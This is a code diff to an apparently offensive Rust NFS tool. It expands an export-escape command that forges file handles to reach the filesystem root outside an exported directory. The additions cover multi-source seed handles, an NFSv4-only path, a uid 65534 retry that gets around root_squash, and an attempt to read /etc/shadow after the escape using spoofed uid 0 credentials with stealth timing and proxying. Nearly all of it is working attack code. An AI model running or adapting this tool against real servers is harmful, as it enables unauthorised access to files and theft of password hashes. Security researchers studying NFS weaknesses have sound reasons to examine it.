@@ -15,10 +15,15 @@ use colored::Colorize as _;
 
 use crate::cli::probe::{acquire_and_test_handles, make_client_with_hostname, make_mount_client, make_v2_client_with_hostname, parse_addr_with_port};
 use crate::cli::{GlobalOpts, H_BEHAVIOR, H_TARGET};
+use crate::engine::escape::{EscapeConfig, EscapeProbe, EscapeRootOutcome, find_escape_root, find_escape_root_all};
 use crate::engine::file_handle::{EscapeResult, FileHandleAnalyzer, dedup_variants, derive_handle_variants};
 use crate::proto::auth::{AuthSys, Credential};
+use crate::proto::circuit::CircuitBreaker;
+use crate::proto::conn::ReconnectStrategy;
 use crate::proto::nfs3::types::FileHandle;
 use crate::proto::nfs3::{Nfs3Client, PooledNfs3 as _};
+use crate::proto::pool::{ConnectionPool, PoolKey};
+use crate::proto::transport::PooledTransport;
 use crate::util::stealth::StealthConfig;
 use nfs_v3::FileType;
 
@@ -60,6 +65,11 @@ pub(crate) struct EscapeArgs {
     /// filesystem, so the default covers all practical cases.
     #[arg(long, default_value_t = DEFAULT_MAX_ROOT_SCAN, value_name = "N", help_heading = H_BEHAVIOR)]
     pub max_root_scan: u32,
+
+    /// Try ALL handle sources (MOUNT v3, MOUNT v1, NFSv4 LOOKUP) and
+    /// report every working root handle instead of stopping at the first.
+    #[arg(long, help_heading = H_BEHAVIOR)]
+    pub all: bool,
 }
 
 /// Default BTRFS subvolume scan count. Shared with `scan --auto-escape` so the
@@ -136,103 +146,241 @@ pub(crate) async fn run(args: EscapeArgs, globals: &GlobalOpts) -> anyhow::Resul
     let host = target.host.to_string();
     let export = target.export().unwrap_or("/").to_owned();
 
-    run_inner(&host, &export, args.btrfs_subvols, args.max_root_scan, globals).await?;
+    if args.all {
+        run_all(&host, &export, args.btrfs_subvols, args.max_root_scan, globals).await?;
+    } else {
+        run_inner(&host, &export, args.btrfs_subvols, args.max_root_scan, globals).await?;
+    }
     crate::cli::emit_replay(globals);
     Ok(())
 }
 
-/// Strategy (fully automatic, no flags needed):
-///   0. Probe WebNFS public handles (cheapest -- one LOOKUP, no MOUNT needed).
-///   1. Mount the export and detect the filesystem type from the handle format.
-///   2. Probe known root inodes for the detected type.
-///   3. If all known candidates return STALE, fall back to scanning
-///      inodes 2..=max_root_scan.
+/// Single-result escape: try every method, print the first success.
 ///
-/// The printed handle is confirmed live (GETATTR returns NFS3_OK or ACCES) before
-/// being shown. ACCES counts as a hit -- the handle format is valid; only the
-/// credential is rejected.
+/// Cascade: WebNFS → v3 MOUNT → handle matrix → v2 MOUNT → v4 handle → v4 LOOKUPP.
+/// Delegates to `find_escape_any` for the cascade logic, then handles output.
 async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<()> {
     eprintln!("{}", crate::output::status_info(&format!("Escaping export {host}:{export}")));
 
-    // Phase 0: WebNFS public handle probe -- cheapest path, no MOUNT needed.
-    // One LOOKUP per NFS version with a well-known constant handle (RFC 2054
-    // sec. 5, 6). Falls through silently when the server does not support WebNFS.
-    if let Some(outcome) = try_webnfs_escape(host, globals).await {
-        if let EscapeOutcome::WebNfs { ref public_handle, version } = outcome {
-            print_webnfs_success(public_handle, version, host);
-        }
-        return Ok(());
-    }
-
-    // Try NFSv3 first; if MOUNT v3 fails, try the handle matrix (MOUNT v1
-    // handle with v3 ops, padded/trimmed variants), then fall back to NFSv2.
-    let result = find_escape(host, export, btrfs_subvols, max_root_scan, globals, true).await;
-    let (probe_client, outcome) = match result {
-        Ok(r) => r,
-        Err(v3_err) => {
-            // Handle matrix: acquire v1+v3 handles, derive all length variants,
-            // test root candidates from each seed against v3 + v2 GETATTR.
-            if let Some(r) = find_escape_matrix(host, export, btrfs_subvols, max_root_scan, globals, true).await {
-                r
-            } else {
-                // Matrix found nothing -- fall back to pure v2 path.
-                eprintln!("{}", crate::output::status_info("MOUNT v3 failed; trying NFSv2 escape"));
-                match find_escape_v2(host, export, max_root_scan, globals).await {
-                    Ok(o) => {
-                        match &o {
-                            EscapeOutcome::Success { candidate, note } => print_escape_success(candidate, note, host),
-                            EscapeOutcome::WebNfs { public_handle, version } => print_webnfs_success(public_handle, version, host),
-                            EscapeOutcome::Nfs4Lookupp { root_handle, verified } => print_nfs4_lookupp_success(root_handle, *verified, host),
-                            EscapeOutcome::StaleNoRoot => eprintln!("{}", crate::output::status_err(&format!("NFSv2: handle format valid (STALE) but root not found in inodes 2..={max_root_scan}."))),
-                            EscapeOutcome::Unsupported => eprintln!("{}", crate::output::status_err("NFSv2: handle format rejected or export is already the filesystem root.")),
-                        }
-                        return Ok(());
-                    },
-                    Err(v2_err) => {
-                        // All MOUNT-based paths failed -- try v4 LOOKUPP as last resort.
-                        if let Some(v4) = try_nfs4_escape(host, export, globals).await {
-                            if let EscapeOutcome::Nfs4Lookupp { ref root_handle, verified } = v4 {
-                                print_nfs4_lookupp_success(root_handle, verified, host);
-                            }
-                            return Ok(());
-                        }
-                        eprintln!("{}", crate::output::status_err("MOUNT failed on both v3 and v1 -- export may not exist or server is unreachable"));
-                        eprintln!("  v3: {v3_err}");
-                        eprintln!("  v1: {v2_err}");
-                        return Ok(());
-                    },
-                }
-            }
-        },
-    };
+    let outcome = find_escape_any(host, export, btrfs_subvols, max_root_scan, globals, true).await?;
 
     match outcome {
-        EscapeOutcome::Success { candidate, note } => {
-            print_escape_success(&candidate, &note, host);
-            try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
-        },
-        EscapeOutcome::WebNfs { public_handle, version } => {
-            print_webnfs_success(&public_handle, version, host);
-        },
-        EscapeOutcome::Nfs4Lookupp { root_handle, verified } => {
-            print_nfs4_lookupp_success(&root_handle, verified, host);
-        },
-        EscapeOutcome::StaleNoRoot | EscapeOutcome::Unsupported => {
-            // v3 handle construction failed -- try v4 LOOKUPP as last resort.
-            if let Some(v4_outcome) = try_nfs4_escape(host, export, globals).await {
-                if let EscapeOutcome::Nfs4Lookupp { ref root_handle, verified } = v4_outcome {
-                    print_nfs4_lookupp_success(root_handle, verified, host);
-                }
-                return Ok(());
+        EscapeOutcome::Success { ref candidate, ref note } => {
+            print_escape_success(candidate, note, host);
+            // Attempt post-escape /etc/shadow read via v3 (best-effort).
+            let addr = parse_addr_with_port(host, globals.nfs_port).ok();
+            if let Some(addr) = addr {
+                let stealth = StealthConfig::new(globals.delay, globals.jitter);
+                let (_, _, client) = make_client_with_hostname(addr, export, 0, 0, &[], stealth, globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
+                try_read_shadow_post_escape(&client, &candidate.root_handle).await;
             }
-            if matches!(outcome, EscapeOutcome::StaleNoRoot) {
-                eprintln!("{}", crate::output::status_err(&format!("Handle format is valid (STALE hits) but root not found in inodes 2..={max_root_scan}. Try --max-root-scan with a higher value.")));
-            } else {
-                eprintln!("{}", crate::output::status_err("Export escape not available -- the export already is the filesystem root, or the server rejected the handle format (BADHANDLE / non-Linux)"));
-            }
+        },
+        EscapeOutcome::WebNfs { ref public_handle, version } => print_webnfs_success(public_handle, version, host),
+        EscapeOutcome::Nfs4Lookupp { ref root_handle, verified } => print_nfs4_lookupp_success(root_handle, verified, host),
+        EscapeOutcome::StaleNoRoot => {
+            eprintln!("{}", crate::output::status_err(&format!("Handle format is valid (STALE hits) but root not found in inodes 2..={max_root_scan}. Try --max-root-scan with a higher value.")));
+        },
+        EscapeOutcome::Unsupported => {
+            eprintln!("{}", crate::output::status_err("Export escape not available -- the server rejected the handle format (BADHANDLE / non-Linux)"));
         },
     }
     Ok(())
+}
+
+/// A seed handle with its source label (used by `--all` mode).
+struct EscapeSeed {
+    handle: FileHandle,
+    source: String,
+}
+
+/// A successful root handle with the seed that produced it (used by `--all` mode).
+struct AllEscapeResult {
+    candidate: EscapeResult,
+    seed_source: String,
+}
+
+/// Comprehensive multi-seed escape: acquire handles from ALL available sources
+/// (MOUNT v3, MOUNT v1, NFSv4 LOOKUP), run `find_escape_root_all` on each unique
+/// seed, and report every working root handle.
+///
+/// Unlike `run_inner` (first-success-wins), this mode is exhaustive: it tests
+/// every seed against the full escape algorithm and collects all verified root
+/// handles. Useful for mapping the full attack surface of an export.
+async fn run_all(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<()> {
+    use std::collections::HashSet;
+
+    eprintln!("{}", crate::output::status_info(&format!("Escaping export {host}:{export} (--all: comprehensive multi-seed mode)")));
+
+    let addr = parse_addr_with_port(host, globals.nfs_port)?;
+    let mount = make_mount_client(globals);
+    let stealth = StealthConfig::new(globals.delay, globals.jitter);
+
+    // --- Collect seed handles from all available sources ---
+
+    let mut seeds: Vec<EscapeSeed> = Vec::new();
+    let mut seen_seed_bytes: HashSet<Vec<u8>> = HashSet::new();
+
+    // Source 1: MOUNT v3
+    stealth.wait().await;
+    match mount.mount(addr, export).await {
+        Ok(mnt) => {
+            let label = format!("MOUNT v3 ({} bytes)", mnt.handle.len());
+            eprintln!("{}", crate::output::status_info(&format!("  {label}: {}", mnt.handle.to_hex())));
+            if seen_seed_bytes.insert(mnt.handle.as_bytes().to_vec()) {
+                seeds.push(EscapeSeed { handle: mnt.handle, source: label });
+            }
+        },
+        Err(e) => eprintln!("{}", crate::output::status_warn(&format!("  MOUNT v3 failed: {e}"))),
+    }
+
+    // Source 2: MOUNT v1
+    stealth.wait().await;
+    match mount.mount_v1(addr, export).await {
+        Ok(mnt) => {
+            let label = format!("MOUNT v1 ({} bytes)", mnt.handle.len());
+            eprintln!("{}", crate::output::status_info(&format!("  {label}: {}", mnt.handle.to_hex())));
+            if seen_seed_bytes.insert(mnt.handle.as_bytes().to_vec()) {
+                seeds.push(EscapeSeed { handle: mnt.handle, source: label });
+            }
+        },
+        Err(e) => eprintln!("{}", crate::output::status_warn(&format!("  MOUNT v1 failed: {e}"))),
+    }
+
+    // Source 3: NFSv4 LOOKUP -- navigate the pseudo-FS into the export.
+    if let Some(fh) = acquire_v4_lookup_handle(host, export, globals).await {
+        let label = format!("NFSv4 LOOKUP ({} bytes)", fh.len());
+        eprintln!("{}", crate::output::status_info(&format!("  {label}: {}", fh.to_hex())));
+        if seen_seed_bytes.insert(fh.as_bytes().to_vec()) {
+            seeds.push(EscapeSeed { handle: fh, source: label });
+        }
+    } else {
+        eprintln!("{}", crate::output::status_warn("  NFSv4 LOOKUP failed"));
+    }
+
+    if seeds.is_empty() {
+        eprintln!("{}", crate::output::status_err("No seed handles acquired from any source -- export may not exist or server is unreachable"));
+        return Ok(());
+    }
+
+    eprintln!("{}", crate::output::status_info(&format!("{} unique seed handle(s) acquired", seeds.len())));
+
+    // --- Build the NFSv3 probe client (shared across all seeds) ---
+
+    let direct_port = globals.nfs_port.unwrap_or(2049);
+    let (_, _, probe_client) = make_client_with_hostname(addr, export, 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), Some(direct_port), &globals.hostname);
+    let probe = Nfs3EscapeProbe { client: &probe_client };
+    let config = EscapeConfig { btrfs_subvols, max_root_scan, announce: true };
+
+    // --- Run find_escape_root_all on each seed, collecting all results ---
+
+    let mut all_results: Vec<AllEscapeResult> = Vec::new();
+    let mut seen_root_bytes: HashSet<Vec<u8>> = HashSet::new();
+
+    for seed in &seeds {
+        eprintln!();
+        eprintln!("{}", crate::output::status_info(&format!("Testing seed from {} ...", seed.source)));
+
+        let hits = find_escape_root_all(&probe, seed.handle.as_bytes(), &config).await;
+        for hit in hits {
+            if seen_root_bytes.insert(hit.root_handle.as_bytes().to_vec()) {
+                all_results.push(AllEscapeResult { candidate: hit, seed_source: seed.source.clone() });
+            }
+        }
+    }
+
+    // --- Also try NFSv4 LOOKUPP as a structurally different escape ---
+
+    let v4_lookupp = try_nfs4_escape(host, export, globals).await;
+
+    // --- Print report ---
+
+    println!();
+    println!("  {}", "Handle sources:".bold());
+    for seed in &seeds {
+        println!("    {:20} {}", seed.source, seed.handle.to_hex().dimmed());
+    }
+
+    if all_results.is_empty() && v4_lookupp.is_none() {
+        println!();
+        eprintln!("{}", crate::output::status_err("No root handles found from any seed source"));
+        return Ok(());
+    }
+
+    if !all_results.is_empty() {
+        println!();
+        println!("  {}", "Results:".bold());
+        for r in &all_results {
+            println!("    {}  {:?} inode {}  via {}  handle: {}", "[+]".bold().green(), r.candidate.fs_type, r.candidate.inode_number, r.seed_source.dimmed(), r.candidate.root_handle.to_hex().cyan());
+        }
+    }
+
+    if let Some(EscapeOutcome::Nfs4Lookupp { ref root_handle, verified }) = v4_lookupp {
+        println!();
+        if verified {
+            println!("    {}  NFSv4 LOOKUPP filesystem root  handle: {}", "[+]".bold().green(), root_handle.to_hex().cyan());
+        } else {
+            println!("    {}  NFSv4 LOOKUPP pseudo-root (cross-export, v4 only)  handle: {}", "[+]".bold().green(), root_handle.to_hex().cyan());
+        }
+    }
+
+    let total = all_results.len() + usize::from(v4_lookupp.is_some());
+    println!();
+    println!("  {} root handle(s) found from {} seed source(s).", total.to_string().bold(), seeds.len());
+
+    // Print next steps for the first root handle
+    if let Some(first) = all_results.first() {
+        let hex = first.candidate.root_handle.to_hex();
+        crate::output::print_handle_next_steps(&hex, host);
+    } else if let Some(EscapeOutcome::Nfs4Lookupp { ref root_handle, .. }) = v4_lookupp {
+        let hex = root_handle.to_hex();
+        crate::output::print_handle_next_steps(&hex, host);
+    }
+    println!();
+
+    Ok(())
+}
+
+/// Acquire a seed handle via NFSv4 LOOKUP into the export path.
+///
+/// Connects to port 2049, navigates PUTROOTFH -> LOOKUP chain to the export
+/// path components, then GETFH to retrieve the file handle. This handle has
+/// the correct fsid for the export's filesystem and can serve as an escape
+/// seed even when MOUNT is firewalled.
+async fn acquire_v4_lookup_handle(host: &str, export: &str, globals: &GlobalOpts) -> Option<FileHandle> {
+    use crate::proto::nfs4::Nfs4Client as PooledNfs4Client;
+
+    let addr = parse_addr_with_port(host, globals.nfs_port).ok()?;
+    let nfs_port = globals.nfs_port.unwrap_or(2049);
+
+    // Build the same PooledTransport the shell uses — this handles auth
+    // context correctly across export junction crossings.
+    let pool = std::sync::Arc::new(match &globals.proxy {
+        Some(p) => ConnectionPool::with_proxy(p.clone()),
+        None => ConnectionPool::default_config(),
+    });
+    let circuit = std::sync::Arc::new(CircuitBreaker::default_config());
+    let stealth = StealthConfig::new(globals.delay, globals.jitter);
+    let gids = crate::cli::probe::build_gid_list(globals.gid, &globals.aux_gids);
+    let cred = Credential::Sys(AuthSys::with_groups(globals.uid, globals.gid, &gids, &globals.hostname));
+    let pool_key = PoolKey { host: addr, export: format!("__v4_escape__{nfs_port}"), uid: globals.uid, gid: globals.gid };
+    let transport = PooledTransport::new_direct(pool, pool_key, circuit, stealth, cred, ReconnectStrategy::Persistent, nfs_port);
+    let client = PooledNfs4Client::new(transport);
+
+    // Navigate component-by-component. The pooled transport handles auth
+    // context at each junction — same as the shell's `cd` command.
+    let components: Vec<&str> = export.trim_matches('/').split('/').filter(|s| !s.is_empty()).collect();
+    let mut fh = client.get_root_fh().await.ok()?;
+    let root_fh = fh.clone();
+    for comp in &components {
+        match client.lookup(fh.as_slice(), comp).await {
+            Ok((child, _)) => fh = child,
+            Err(_) => break,
+        }
+    }
+    if fh == root_fh {
+        return None; // didn't leave the pseudo-root
+    }
+    Some(FileHandle::from_bytes(&fh))
 }
 
 /// Try NFSv3 escape first, then NFSv2 fallback, then NFSv4 LOOKUPP.
@@ -252,7 +400,14 @@ pub(crate) async fn find_escape_any(host: &str, export: &str, btrfs_subvols: u32
             } else {
                 match find_escape_v2(host, export, max_root_scan, globals).await {
                     Ok(o) => o,
-                    Err(_) => return Ok(try_nfs4_escape(host, export, globals).await.unwrap_or(EscapeOutcome::Unsupported)),
+                    Err(_) => {
+                        // v3 and v2 MOUNT both failed. Try NFSv4 handle construction
+                        // (acquire seed via v4 LOOKUP, probe via v4 GETATTR).
+                        match find_escape_v4(host, export, btrfs_subvols, max_root_scan, globals, announce).await {
+                            Ok(o @ EscapeOutcome::Success { .. }) => return Ok(o),
+                            _ => return Ok(try_nfs4_escape(host, export, globals).await.unwrap_or(EscapeOutcome::Unsupported)),
+                        }
+                    },
                 }
             }
         },
@@ -384,6 +539,105 @@ fn print_webnfs_success(public_handle: &FileHandle, version: &str, host: &str) {
     println!();
 }
 
+/// Adapts `Nfs3Client` to the version-neutral `EscapeProbe` trait so the shared
+/// escape engine can probe handles through NFSv3.
+struct Nfs3EscapeProbe<'a> {
+    client: &'a Nfs3Client,
+}
+
+impl EscapeProbe for Nfs3EscapeProbe<'_> {
+    async fn probe_getattr(&self, handle: &[u8]) -> anyhow::Result<(bool, u64)> {
+        let fh = FileHandle::from_bytes(handle);
+        let attrs = self.client.attrs(&fh).await.map_err(|e| anyhow::anyhow!("{e}"))?;
+        Ok((attrs.file_type == FileType::Directory, attrs.fileid))
+    }
+
+    async fn probe_lookup(&self, dir: &[u8], name: &str) -> anyhow::Result<Vec<u8>> {
+        let fh = FileHandle::from_bytes(dir);
+        let (child, _) = self.client.resolve(&fh, name).await.map_err(|e| anyhow::anyhow!("{e}"))?;
+        Ok(child.as_bytes().to_vec())
+    }
+}
+
+/// NFSv4 escape probe: wraps a pooled `Nfs4Client` so the escape engine
+/// can probe candidate handles via NFSv4 COMPOUND (GETATTR / LOOKUP).
+struct Nfs4EscapeProbe {
+    client: crate::proto::nfs4::Nfs4Client,
+}
+
+impl EscapeProbe for Nfs4EscapeProbe {
+    async fn probe_getattr(&self, handle: &[u8]) -> anyhow::Result<(bool, u64)> {
+        let info = self.client.getattr(handle).await.map_err(|e| anyhow::anyhow!("{e}"))?;
+        let is_dir = info.ftype == Some(nfs_v4::Nfs4FileType::Directory);
+        Ok((is_dir, info.fileid.unwrap_or(0)))
+    }
+
+    async fn probe_lookup(&self, dir: &[u8], name: &str) -> anyhow::Result<Vec<u8>> {
+        let (fh, _) = self.client.lookup(dir, name).await.map_err(|e| anyhow::anyhow!("{e}"))?;
+        Ok(fh)
+    }
+}
+
+/// NFSv4-only export escape: acquire seed via v4 LOOKUP, probe via v4 GETATTR.
+///
+/// This is the fallback when MOUNT (v3) and MOUNT v1 (v2) are both unreachable
+/// (firewalled or server is NFSv4-only). Uses the same PooledTransport as the
+/// v4 shell so export junction crossings work correctly.
+async fn find_escape_v4(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> anyhow::Result<EscapeOutcome> {
+    use crate::proto::nfs4::Nfs4Client as PooledNfs4Client;
+
+    let addr = parse_addr_with_port(host, globals.nfs_port)?;
+    let nfs_port = globals.nfs_port.unwrap_or(2049);
+
+    if announce {
+        eprintln!("{}", crate::output::status_info(&format!("Trying NFSv4 handle escape on {host}:{nfs_port}")));
+    }
+
+    // Build a pooled v4 transport — same as the shell, so junction crossings work.
+    let pool = std::sync::Arc::new(match &globals.proxy {
+        Some(p) => ConnectionPool::with_proxy(p.clone()),
+        None => ConnectionPool::default_config(),
+    });
+    let circuit = std::sync::Arc::new(CircuitBreaker::default_config());
+    let stealth = StealthConfig::new(globals.delay, globals.jitter);
+    let gids = crate::cli::probe::build_gid_list(globals.gid, &globals.aux_gids);
+    let cred = Credential::Sys(AuthSys::with_groups(globals.uid, globals.gid, &gids, &globals.hostname));
+    let pool_key = PoolKey { host: addr, export: format!("__v4_escape__{nfs_port}"), uid: globals.uid, gid: globals.gid };
+    let transport = PooledTransport::new_direct(pool, pool_key, circuit, stealth, cred, ReconnectStrategy::Persistent, nfs_port);
+    let client = PooledNfs4Client::new(transport);
+
+    // Navigate the pseudo-FS to the export path, component by component.
+    let components: Vec<&str> = export.trim_matches('/').split('/').filter(|s| !s.is_empty()).collect();
+    let mut fh = client.get_root_fh().await.map_err(|e| anyhow::anyhow!("NFSv4 PUTROOTFH: {e}"))?;
+    let root_fh = fh.clone();
+    for comp in &components {
+        match client.lookup(fh.as_slice(), comp).await {
+            Ok((child, _)) => fh = child,
+            Err(_) => break,
+        }
+    }
+    if fh == root_fh {
+        anyhow::bail!("NFSv4 LOOKUP could not navigate into the export");
+    }
+
+    if announce {
+        let fh_hex = fh.iter().map(|b| format!("{b:02x}")).collect::<String>();
+        eprintln!("{}", crate::output::status_info(&format!("NFSv4 seed handle ({} bytes): {fh_hex}", fh.len())));
+    }
+
+    // Probe candidates using NFSv4 GETATTR (not v3 — the handle's fsid
+    // may only be valid in the v4 export context).
+    let probe = Nfs4EscapeProbe { client };
+    let config = EscapeConfig { btrfs_subvols, max_root_scan, announce, ..EscapeConfig::default() };
+    let seed = FileHandle::from_bytes(&fh);
+
+    match find_escape_root(&probe, seed.as_bytes(), &config).await {
+        EscapeRootOutcome::Success(result) => Ok(EscapeOutcome::Success { candidate: result, note: "NFSv4 handle escape".to_owned() }),
+        EscapeRootOutcome::StaleNoRoot => Ok(EscapeOutcome::StaleNoRoot),
+        EscapeRootOutcome::Unsupported => Ok(EscapeOutcome::Unsupported),
+    }
+}
+
 /// NFSv3 export-escape primitive.
 ///
 /// Mounts `host:export`, builds a uid=0 probe client, and searches for a working
@@ -405,107 +659,27 @@ pub(crate) async fn find_escape(host: &str, export: &str, btrfs_subvols: u32, ma
     // portmapper is firewalled.
     let (_, _, probe_client) = make_client_with_hostname(addr, export, 0, 0, &[], StealthConfig::new(globals.delay, globals.jitter), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
 
-    // The export root's own inode. A candidate handle that resolves to this same
-    // inode has crossed no boundary (whole-filesystem export, incl. the
-    // compound-UUID XFS case `export_is_fs_root` cannot fingerprint), so it must
-    // not be reported as an escape (#22/#48). `None` when root_squash blocks the
-    // uid=0 GETATTR -- then we fall back to the format/known-inode signals.
-    let export_fileid: Option<u64> = match probe_client.attrs(&mnt.handle).await {
-        Ok(a) => Some(a.fileid),
-        _ => None,
-    };
+    let probe = Nfs3EscapeProbe { client: &probe_client };
+    let config = EscapeConfig { btrfs_subvols, max_root_scan, announce };
 
-    // Guard: if the export already IS the filesystem root there is nothing outside the
-    // export to reach -- reconstructing inode 2 / 128 just reproduces a handle inside the
-    // export, whose GETATTR (OK+NF3DIR) would otherwise be reported as a bogus "escape
-    // successful". Short-circuit here so the guard covers Phase 1 AND the Phase-2 scan
-    // (nfs_analyze applies the same `export_fileid in [2, 128]` check).
-    if export_is_fs_root(&probe_client, &mnt.handle).await {
-        if announce {
-            eprintln!("{}", crate::output::status_info(&format!("Export {host}:{export} already is the filesystem root -- nothing outside the export to reach")));
-        }
-        return Ok((probe_client, EscapeOutcome::Unsupported));
+    let engine_outcome = find_escape_root(&probe, mnt.handle.as_bytes(), &config).await;
+
+    match engine_outcome {
+        EscapeRootOutcome::Success(result) => Ok((probe_client, EscapeOutcome::Success { candidate: result, note: "verified".to_owned() })),
+        EscapeRootOutcome::StaleNoRoot => {
+            // The engine's brute-force pass cannot switch credentials (EscapeProbe
+            // has no credential API), so ACCES hits during the scan are left
+            // unconfirmed. Re-probe ACCES candidates with the root_squash anon
+            // identity (uid/gid 65534) to catch the case where root_squash blocks
+            // uid=0 but the handle IS the filesystem root (mode 0755, traversable
+            // by nobody).
+            if let Some(result) = retry_acces_as_nobody(&probe_client, &mnt.handle, max_root_scan).await {
+                return Ok((probe_client, EscapeOutcome::Success { candidate: result, note: "found via scan (confirmed root dir; root_squash active)".to_owned() }));
+            }
+            Ok((probe_client, EscapeOutcome::StaleNoRoot))
+        },
+        EscapeRootOutcome::Unsupported => Ok((probe_client, EscapeOutcome::Unsupported)),
     }
-
-    // --- Phase 1: known root inodes, ordered ext4 -> XFS -> BTRFS ---
-
-    // ext4 (inode 2) and XFS candidates (128/64/32) first -- cheapest probes.
-    let known: Vec<EscapeResult> = FileHandleAnalyzer::construct_root_candidates(&mnt.handle);
-    for candidate in &known {
-        if announce {
-            eprintln!("{}", crate::output::status_info(&format!("Probing {:?} inode {} ...", candidate.fs_type, candidate.inode_number)));
-        }
-        if probe_escape_candidate(&probe_client, candidate, export_fileid, &mnt.handle).await {
-            return Ok((probe_client, EscapeOutcome::Success { candidate: candidate.clone(), note: "verified".to_owned() }));
-        }
-    }
-
-    // BTRFS subvolume IDs (5, then 256..256+btrfs_subvols) last -- more expensive.
-    let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&mnt.handle, btrfs_subvols);
-    let mut announced = std::collections::HashSet::with_capacity(btrfs.len());
-    for candidate in &btrfs {
-        if announce && announced.insert(candidate.inode_number) {
-            eprintln!("{}", crate::output::status_info(&format!("Probing BTRFS subvol {} ...", candidate.inode_number)));
-        }
-        if probe_escape_candidate(&probe_client, candidate, export_fileid, &mnt.handle).await {
-            return Ok((probe_client, EscapeOutcome::Success { candidate: candidate.clone(), note: "subvolume (verified)".to_owned() }));
-        }
-    }
-
-    // --- Phase 2: fallback scan (inodes 2..=max_root_scan) ---
-    if announce && !known.is_empty() {
-        eprintln!("{}", crate::output::status_warn(&format!("Known candidates returned STALE -- scanning inodes 2..={max_root_scan}")));
-    }
-
-    let seed = &mnt.handle;
-    let mut found_stale = false;
-
-    for inode in 2..=max_root_scan {
-        let Some(candidate) = FileHandleAnalyzer::construct_handle_for_inode(seed, inode, 0) else {
-            continue;
-        };
-
-        match probe_client.attrs(&candidate.root_handle).await {
-            Ok(a) if a.file_type == FileType::Directory => {
-                // A directory hit alone is not the root: inode numbers are dynamic
-                // (XFS), so the first directory in 2..200 can be an arbitrary
-                // subdirectory. Confirm it is not the export itself (identity) and
-                // is genuinely the filesystem root (its own parent) before
-                // declaring success (#27).
-                let self_id = a.fileid;
-                if export_fileid.is_none_or(|exp| self_id != exp) && scan_hit_is_root(&probe_client, &candidate.root_handle, self_id).await {
-                    return Ok((probe_client, EscapeOutcome::Success { candidate, note: "found via scan (confirmed root)".to_owned() }));
-                }
-                found_stale = true; // valid format + directory, but not the root -- keep scanning
-                tracing::debug!(inode, "scan hit a directory but not the filesystem root -- continuing");
-            },
-            Ok(_) => {
-                tracing::debug!(inode, "scan hit non-directory inode (within export subtree)");
-            },
-            Err(ref e) if e.is_permission_denied() => {
-                // ACCES proves only that the handle FORMAT was accepted (root_squash blocks
-                // the uid=0 read) -- it is returned by ANY protected inode, so a bare ACCES
-                // is NOT proof that this inode is a directory, let alone the filesystem root.
-                // Confirm positively before declaring success; otherwise a random 0700
-                // subdirectory in the scan range would be mislabelled as the root.
-                found_stale = true; // the format is valid even when root cannot be confirmed
-                if confirm_root_dir(&probe_client, &candidate).await {
-                    return Ok((probe_client, EscapeOutcome::Success { candidate, note: "found via scan (confirmed root dir; root_squash active)".to_owned() }));
-                }
-                tracing::debug!(inode, "ACCES but root not confirmed -- continuing scan");
-            },
-            Err(ref e) if e.is_stale() => {
-                found_stale = true;
-                tracing::debug!(inode, "STALE");
-            },
-            Err(e) => {
-                tracing::debug!(inode, err = %e, "probe rejected");
-            },
-        }
-    }
-
-    let outcome = if found_stale { EscapeOutcome::StaleNoRoot } else { EscapeOutcome::Unsupported };
-    Ok((probe_client, outcome))
 }
 
 /// True when the exported directory is itself the filesystem root (so there is nothing
@@ -535,38 +709,6 @@ async fn export_is_fs_root(client: &Nfs3Client, mount_handle: &FileHandle) -> bo
     // to FS_TREE." Let the probe phase handle BTRFS -- it will try FS_TREE (subvol 5)
     // and other subvols, and the identity check blocks self-matches.
     false
-}
-
-/// Probe a candidate handle with GETATTR and report whether it is a valid directory.
-///
-/// Two acceptance conditions:
-/// - `NFS3_OK` AND `file_type == NF3DIR` -- handle is valid and points to a directory.
-///   The directory check prevents false positives from non-root inodes that happen to
-///   exist (on ext4, inode 128 is the journal file, not a directory).
-/// - `NFS3ERR_ACCES` / `NFS3ERR_PERM` -- handle format was accepted (root_squash
-///   blocks uid=0 reads on the root dir).
-async fn probe_escape_candidate(client: &Nfs3Client, candidate: &EscapeResult, export_fileid: Option<u64>, export_handle: &FileHandle) -> bool {
-    match client.attrs(&candidate.root_handle).await {
-        Ok(a) => {
-            if a.file_type != FileType::Directory {
-                return false;
-            }
-            // For BTRFS, different subvolumes share the same root fileid (256 =
-            // BTRFS_FIRST_FREE_OBJECTID), so fileid alone can't distinguish them.
-            // Compare handle bytes: different handles = different subvolumes = escape.
-            if candidate.root_handle.as_bytes() == export_handle.as_bytes() {
-                return false;
-            }
-            // For non-BTRFS: a matching fileid means the constructed handle resolves
-            // to the export's own root directory (whole-filesystem export).
-            if candidate.fs_type != crate::engine::file_handle::FsType::Btrfs && export_fileid.is_some_and(|exp| a.fileid == exp) {
-                return false;
-            }
-            true
-        },
-        Err(ref e) if e.is_permission_denied() => true,
-        _ => false,
-    }
 }
 
 /// Definitive filesystem-root test for a fallback-scan directory hit: the root is
@@ -619,6 +761,30 @@ async fn confirm_root_dir(client: &Nfs3Client, candidate: &EscapeResult) -> bool
         }
     }
     false
+}
+
+/// Re-scan ACCES candidates with uid/gid 65534 after the engine reports `StaleNoRoot`.
+///
+/// The shared engine's brute-force pass runs under a single credential (uid=0) and
+/// cannot switch identities (EscapeProbe has no credential API). When root_squash is
+/// active, uid=0 GETATTR returns ACCES on every protected inode, including the real
+/// filesystem root. The engine correctly records these as "format valid" but cannot
+/// confirm root because it lacks the unprivileged re-probe. This function fills
+/// that gap: it re-runs the inode scan range, identifies ACCES hits, and calls
+/// `confirm_root_dir` (which switches to nobody uid 65534) to confirm root.
+async fn retry_acces_as_nobody(client: &Nfs3Client, export_handle: &FileHandle, max_root_scan: u32) -> Option<EscapeResult> {
+    for inode in 1..=max_root_scan {
+        let candidates = FileHandleAnalyzer::construct_candidates_all_variants(export_handle, inode, 0);
+        for candidate in &candidates {
+            if let Err(ref e) = client.attrs(&candidate.root_handle).await
+                && e.is_permission_denied()
+                && confirm_root_dir(client, candidate).await
+            {
+                return Some(candidate.clone());
+            }
+        }
+    }
+    None
 }
 
 /// Print the successful escape result and next-step hints.
